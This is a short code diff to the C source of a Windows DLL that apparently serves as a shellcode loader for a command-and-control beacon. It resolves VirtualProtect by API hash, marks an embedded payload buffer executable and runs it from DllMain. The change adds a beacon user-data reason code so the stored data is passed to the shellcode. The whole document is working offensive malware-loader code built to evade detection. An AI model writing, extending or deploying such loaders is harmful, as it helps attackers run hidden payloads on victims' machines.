@@ -71,8 +71,18 @@ static FARPROC _find_exp ( void * base, unsigned int hash )
     return 0;
 }
 
+#define DLL_BEACON_USER_DATA 0x0d
+
+static void * g_user_data = 0;
+
 BOOL WINAPI DllMain ( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
 {
+    if ( fdwReason == DLL_BEACON_USER_DATA )
+    {
+        g_user_data = lpvReserved;
+        return TRUE;
+    }
+
     if ( fdwReason == DLL_PROCESS_ATTACH )
     {
         /* 0xa3e6f6c3 = kernel32.dll, 0x820621f3 = VirtualProtect */
@@ -82,7 +92,7 @@ BOOL WINAPI DllMain ( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
         DWORD old = 0;
         if ( pVP && pVP ( sc_payload, SC_PAYLOAD_SIZE, PAGE_EXECUTE_READ, &old ) )
         {
-            ( (void (*)(void*)) sc_payload ) ( lpvReserved );
+            ( (void (*)(void*)) sc_payload ) ( g_user_data );
         }
     }
 
